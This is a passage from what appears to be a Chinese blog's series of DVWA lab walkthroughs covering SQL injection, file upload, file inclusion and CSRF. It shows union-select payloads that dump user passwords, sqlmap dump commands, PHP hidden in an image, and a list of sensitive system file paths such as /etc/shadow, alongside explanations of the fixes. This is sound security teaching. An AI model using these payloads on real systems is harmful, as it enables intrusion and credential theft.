aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>and &#39;1&#39;=&#39;1&#39;</code>显然成立，所以就会返回user_id为1的用户信息。</p><ul><li>输入ID为<code>1&#39; or &#39;1&#39; = &#39;1</code>时出现以下提示：</li></ul><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502144303.png" alt="20190502144303.png"></p><p>界面将所有的用户信息都显示了出来，因为此时执行的sql语句相当于：</p> <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">or</span> <span class="token string">'1'</span> <span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>or &#39;1&#39;=&#39;1&#39;</code>显然成立，所以就会返回所有的用户信息。</p><p>以上实验过程说明存在字符型注入。</p></li><li><p>猜解数据表中的字段数</p><ul><li><p>输入ID为<code>1&#39; order by 1 #</code>, 正常显示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502150715.png" alt="20190502150715.png"></p></li><li><p>输入ID为<code>1&#39; order by 2 #</code>, 正常显示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502150826.png" alt="20190502150826.png"></p></li><li><p>输入ID为<code>1&#39; order by 3 #</code>, 不正常显示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502150938.png" alt="20190502150938.png"></p><p>说明数据表中的字段数位2，正常情况下请使用二分法进行测试。</p></li></ul></li><li><p>使用联合查询获取其它有用信息，例如获取数据表名称</p><blockquote><p>union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2，接下来就好办了。</p></blockquote><ul><li><p>输入以下语句进行查询：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可获取数据库名和数据库用户名：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502151701.png" alt="20190502151701.png"></p></li><li><p>输入以下语句进行查询</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token number">1</span><span class="token string">' union select version(),@@version_compile_os#```  可获取数据库版本和当前操作系统：![20190502152012.png](https://raw.githubusercontent.com/handbye/images/master/20190502152012.png)>information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。- 输入以下语句进行查询：```sql1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_name<span class="token punctuation">,</span>table_schema <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可获取数据表名：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502152239.png" alt="20190502152239.png"></p><p>可看到当前数据库中有两个表：<code>guestbook</code>和<code>users</code></p></li></ul></li><li><p>获取表中的字段名</p><p> 输入以下语句进行查询：</p> <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://raw.githubusercontent.com/handbye/images/master/20190502152953.png" alt="20190502152953.png"></p><p> 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p></li><li><p>获取users表中的所有数据</p><p> 输入以下语句进行查询：</p> <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://raw.githubusercontent.com/handbye/images/master/20190502153241.png" alt="20190502153241.png"></p><p> 得到了所有用户的用户名和密码，密码使用MD5加密后的字符串，使用在线MD5解密网站解密即可。</p></li></ol><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>Medium等级不再是用户进行输入，而是改为了选择ID。</p><p>和low等级的注入过程一样，先判断下是字符型注入还是数字注入。</p><p>和LOW等级不同的是这次需要抓包修改：</p><p>使用<code>1 or 1=1</code> 注入，显示如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502162632.png" alt="20190502162632.png"></p><p>使用 <code>1&#39; or &#39;1&#39; = &#39;1</code> 注入，显示如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502165030.png" alt="20190502165030.png"></p><p>说明Medium等级的sql注入位数字型的。之后的注入方法和Low等级相同，不再演示。</p><p><strong>查看Medium等级的源码：</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502165251.png" alt="20190502165251.png"></p><p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号<code>\x00,\n,\r,\,’,”,\x1a</code>进行转义来防止注入，但是此注入类型位数字型的，这个过滤方法也没啥用。</p><p>如果在联合查询时需要用到单引号的地方，如:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_name<span class="token punctuation">,</span>table_schema <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此处dvwa需要用单引号括起来，此时我们可将dvwa转换成16进制的编码进行注入。</p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>High等级将用户输入和界面显示分开在了两个页面上，这种方式的注入和Low等级的注入完全相同。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502205756.png" alt="20190502205756.png"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502210517.png" alt="20190502210517.png"></p><p>查看High等级代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502210614.png" alt="20190502210614.png"></p><p>代码并未对用户输入的字符进行转义或者过滤，只是限制了只是用limit限制了只能输出一行，用#号就可以将其注释掉。</p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>查看代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502210856.png" alt="20190502210856.png"></p><p>使用 anti-token 机制防 CSRF 攻击，检查 id 是不是数字，使用 prepare 预编译再绑定变量a 等方法严格过滤用户输入，有效抵制了sql注入。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>除了使用手工注入，还可以使用自动化工具sqlmap进行注入，相对于手工来说更快，更方便。</p><h3 id="使用sqlmap进行low等级的注入"><a href="#使用sqlmap进行low等级的注入" class="headerlink" title="使用sqlmap进行low等级的注入"></a>使用sqlmap进行low等级的注入</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span>  <span class="token comment">--cookie "security=low; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502233455.png" alt="20190502233455.png"></p><p>可看到sqlmap将所有可利用的sql注入类型全部展示了出来，并且将所有数据库也注入了出来。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span>  <span class="token comment">--cookie "security=low; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" -D dvwa --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502234210.png" alt="20190502234210.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span>  <span class="token comment">--cookie "security=low; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" -D dvwa -T users --column</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502234423.png" alt="20190502234423.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span>  <span class="token comment">--cookie "security=low; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" -D dvwa -T users -C user,password --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502235017.png" alt="20190502235017.png"></p><h3 id="使用sqlmap进行Medium等级的注入"><a href="#使用sqlmap进行Medium等级的注入" class="headerlink" title="使用sqlmap进行Medium等级的注入"></a>使用sqlmap进行Medium等级的注入</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli"</span>  <span class="token comment">--data "id=1&amp;Submit=Submit" --cookie "security=medium; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>唯一不同的是需要使用–data执行post请求参数</p><h3 id="使用sqlmap进行High等级的注入"><a href="#使用sqlmap进行High等级的注入" class="headerlink" title="使用sqlmap进行High等级的注入"></a>使用sqlmap进行High等级的注入</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u <span class="token string">"http://192.168.1.2/dvwa/vulnerabilities/sqli"</span>  <span class="token comment">--data "id=1&amp;Submit=Submit" --cookie "security=high; PHPSESSID=5bel9eq7h1tenbo6j15iu38ij5" --second-url "http://192.168.1.2/dvwa/vulnerabilities/sqli/session-input.php" --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此等级需要使用<code>--second-url</code>指定输入id的页面URL</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><ul><li><a href="https://www.freebuf.com/articles/web/120747.html">https://www.freebuf.com/articles/web/120747.html</a></li><li><a href="https://www.cnblogs.com/jojo-feed/p/10173241.html">https://www.cnblogs.com/jojo-feed/p/10173241.html</a></li><li><a href="https://www.jianshu.com/p/078df7a35671">https://www.jianshu.com/p/078df7a35671</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 文件上传（File Upload）</title>
      <link href="2019/04/29/dvwa-file-upload/"/>
      <url>2019/04/29/dvwa-file-upload/</url>
      
        <content type="html"><![CDATA[<p>文件上传漏洞一般是因为网站上传文件的页面没有对文件类型做严格的过滤，从而导致攻击者能够上传任意文件，如webshell。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>先上传一张正常的图片，观察上传过程。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429230516.png" alt="20190429230516.png"></p><p>上传成功，并且界面上给出了上传地址，虽然是相对路径，但结合<code>http://127.0.0.1/dvwa/vulnerabilities/upload/</code>可以判断出上传路径为：<code>http://127.0.0.1/dvwa/hackable/uploads/</code></p><p>那我们尝试直接上传其它类型的文件看能否上传成功，比如php文件。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429231045.png" alt="20190429231045.png"></p><p>上传成功，接下来尝试访问此文件。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429231329.png" alt="20190429231329.png"></p><p>熟悉的味道，证明php文件可以执行，那么上传一句话木马也是可以的了。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>此等级下上传php文件会有提示<code>Your image was not uploaded. We can only accept JPEG or PNG images.</code></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429231512.png" alt="20190429231512.png"></p><p>说明上传时对文件类型做了判断，非图片类型的文件是不能上传的。</p><p>抓包查看上传图片和上传其它文件有什么不同：</p><p><strong>上传图片抓包：</strong><br><img src="https://raw.githubusercontent.com/handbye/images/master/20190429232325.png" alt="20190429232325.png"></p><p><strong>上传php文件抓包：</strong><br><img src="https://raw.githubusercontent.com/handbye/images/master/20190429232239.png" alt="20190429232239.png"></p><p>可以看到两个的<code>filename</code>和<code>content-type</code>不同，其余的都相同，那是否可以修改test.php文件的filename和content-type然后重新上传呢，来试一下。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429233747.png" alt="20190429233747.png"></p><p>修改test.php为test.jpg, 修改content-type为image/png。 文件上传成功， 尝试去访问test.jpg，发现无法访问。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429233925.png" alt="20190429233925.png"></p><p>看来test.jpg里面的内容无法被读取，该怎么办呢，想起了上节的文件包含漏洞，访问文件时，只要里面有php代码就会被执行，尝试一下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190429234342.png" alt="20190429234342.png"></p><p>test.jpg中的PHP代码被正确执行。</p><p>第二种办法就是将test.php改一下后缀名，改为test.jpg，这样在上传时只需要改<code>filename</code>就行，修改方法与前面相同，不再赘述。</p><p><strong>查看Medum等级代码，发现代码对content-type和文件后缀名做了过滤，并且还限制了文件大小：</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190430204346.png" alt="20190430204346.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>此等级下使用修改数据包重新发送的方法已经不行了，也就是将php文件伪装成png或者jpeg格式的方法行不通了，难道后端代码对图片内容做了鉴定吗，非图片特征的不能上传。</p><p>有什么办法能够将php代码隐藏在图片中呢，想起来‘图种’是怎么弄的吗，在windows上可以用<code>copy</code>命令将文字和图片合到一起。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">copy &#x2F;b test.png+test.php  test1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用编辑器打开可以看到test.php中的代码已经被隐藏到test1.png中</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190430232002.png" alt="20190430232002.png"></p><p>上传test1.png看能否成功。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190430233401.png" alt="20190430233401.png"></p><p>上传成功，利用文件包含漏洞查看能否解析test1.png里面存在的php代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190430233855.png" alt="20190430233855.png"></p><p>解析成功，可以被利用。</p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>查看Impossible等级的代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190430234102.png" alt="20190430234102.png"></p><p>利用<code>substr</code>函数判断最后一个点号后面字符是否是合法的扩展名， 利用<code>md5</code>将上传的文件名变为随机字符串， 利用<code>imagejpeg</code>和<code>imagepng</code>去掉了不属于图片的部分。<br>这种方法有效避免了文件上传漏洞的产生。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 文件包含(File Inclusion)</title>
      <link href="2019/04/28/dvwa-file-inclusion/"/>
      <url>2019/04/28/dvwa-file-inclusion/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含简介"><a href="#文件包含简介" class="headerlink" title="文件包含简介"></a>文件包含简介</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p>在PHP中文件包含函数有以下四种：</p><ul><li>require()</li><li>require_once()</li><li>include()</li><li>include_once()</li></ul><p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。<br>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>示例代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>本地文件包含指的是可以执行windows或者linux下的敏感文件，这些文件一般不是PHP，执行这些文件可以直接显示出文件中的内容</p><h3 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h3><p>windows系统：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">c:\boot.ini &#x2F;&#x2F; 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码c:\windows\php.ini &#x2F;&#x2F; php 配置信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>linux系统：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为ON，<code>include/require</code>等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><blockquote><p>allow_url_fopen = On（是否允许打开远程文件）<br>allow_url_include = On（是否允许include/require远程文件）</p></blockquote><h2 id="LOW等级"><a href="#LOW等级" class="headerlink" title="LOW等级"></a>LOW等级</h2><p>先测试下LOW等级是否有本地文件包含漏洞：</p><p>点击页面上的<code>file1.php</code>查看链接为：<code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php</code></p><p>尝试随便将链接更改一个不存在的文件，显示如下，将服务器的绝对路径也爆了出来。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427225212.png" alt="20190427225212.png"></p><p>在服务器根目录下存在一个phpinfo文件，经过测试可以包含此文件：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427225941.png" alt="20190427225941.png"></p><p>当然一般情况下很难爆出绝对路径，要靠去不断的猜测，当有本地文件包含漏洞时，可以和文件上传漏洞配合使用，上传一个大马getshell。</p><p>接下来测试是否可以远程包含：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427233614.png" alt="20190427233614.png"></p><p>发现也可以远程包含，那这样就不用去上传文件执行了，我们写个木马放到远程服务器直接执行就可以了。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>同样和Low等级一样测试能否本地包含和远程包含。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427232516.png" alt="20190427232516.png"></p><p>可以本地包含。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427233815.png" alt="20190427233815.png"></p><p>远程包含报错，猜测可能是服务器代码对包含的参数加了过滤，仔细分析报错可发现手工加的远程文件链接中的<code>http://</code>不见了，猜测可能是对<code>http://</code>加了过滤。</p><p>重新构造链接，查看能否被包含：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427234418.png" alt="20190427234418.png"></p><p>文件执行成功。</p><p>查看源码果然是对http://和https://进行了过滤，所以我们要善于观察。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427234559.png" alt="20190427234559.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>High等级下，使用前面的办法都无法执行。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427234834.png" alt="20190427234834.png"></p><p>直接提示<code>ERROR: File not found!</code></p><p>那为什么执行file1.php,file2.php,file3.php可以正常执行呢？</p><p>我们执行file10.php,发现报错信息和之前不一样了，猜测可能是只有file开头的文件才可以执行。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427235213.png" alt="20190427235213.png"></p><p>此时就无法使用远程文件包含了，而file开头的正是一种文件访问的格式，可以利用这一点去访问本地文件，但前提要知道此文件的绝对路径，这就必须配合后面的文件上传漏洞一起利用了。</p><p>查看源代码，发现也是如此：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427235519.png" alt="20190427235519.png"></p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>Impossible等价下对访问的文件做了白名单，其余任意文件都无法访问，这就有效避免了文件包含漏洞的产生。</p><p>代码如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427235725.png" alt="20190427235725.png"></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA CSRF</title>
      <link href="2019/04/27/dvwa-CSRF/"/>
      <url>2019/04/27/dvwa-CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><p>CSRF的原理图：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427104355.png" alt="20190427104355.png"></p><p>图片来自<a href="https://www.cnblogs.com/wangyuyu/p/3388169.html">https://www.cnblogs.com/wangyuyu/p/3388169.html</a></p><p>可以看到CSRF是利用了受害者已登录的A网站cooike未失效的情况下诱导用户访问B网站，而访问B网站时会携带A网站的cookie，这样就导致了使用A网站用户的权限处理了B网站的恶意请求。</p><h2 id="LOW等级"><a href="#LOW等级" class="headerlink" title="LOW等级"></a>LOW等级</h2><p>正常去修改密码，查看浏览器的请求。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427105244.png" alt="20190427105244.png"></p><p>发现再request请求中，浏览器想服务器发送了get请求，只要get请求中包含新密码和确认密码两个字段就可修改密码，那是否可以自己构造get请求来修改密码呢，进行尝试：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427105650.png" alt="20190427105650.png"></p><p>尝试后发现密码修改成功。</p><p>当然再实际场景下，我们不可能以这种方式去修改别人的密码，但是我们必须知道修改密码的原理。</p><p>这时候我们就需要利用CSRF漏洞了，可以伪造一个URL发送给受害者，他一旦点击密码就会修改。用http:/1.1.1.1/dvwa/vulnerabilities/csrf/?password_new=admin1234&amp;password_conf=admin1234&amp;Change=Change这样的链接显然不合适，可以利用短链接生成器或者直接伪造HTML页面发送。</p><blockquote><p>1.1.1.1是一个可以访问的公网地址，这里我就随便写了个</p></blockquote><p>这里我使用短链接生成网站<a href="http://url.tool.cc/">http://url.tool.cc/</a>来生成一个短连接<code>http://t.cn/EasESOu</code></p><p>再浏览器里点击这个短连接，密码即可修改，这就是CSRF最简单的一个利用。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>尝试用Low等级的方法，发现无效，页面弹出错误信息：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190427112634.png" alt="20190427112634.png"></p><p>这时候就得去思考为什么会出现这种错误，在这之前我们应该先了解下CSRF的防护，CSRF的防护可以有这几种：</p><ul><li>尽量使用POST，限制GET</li></ul><p>GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。</p><p>当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><ul><li>浏览器Cookie策略</li></ul><p>IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。</p><p>PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存到内存里），Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）。</p><p>PS：另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。</p><ul><li>加验证码</li></ul><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。</p><ul><li>Referer Check</li></ul><p>Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。</p><p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p><ul><li>Anti CSRF Token</li></ul><p>现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。</p><p>例子：</p><ol><li><p>用户访问某个表单页面。</p></li><li><p>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p></li><li><p>在页面表单附带上Token参数。</p></li><li><p>用户提交请求后， 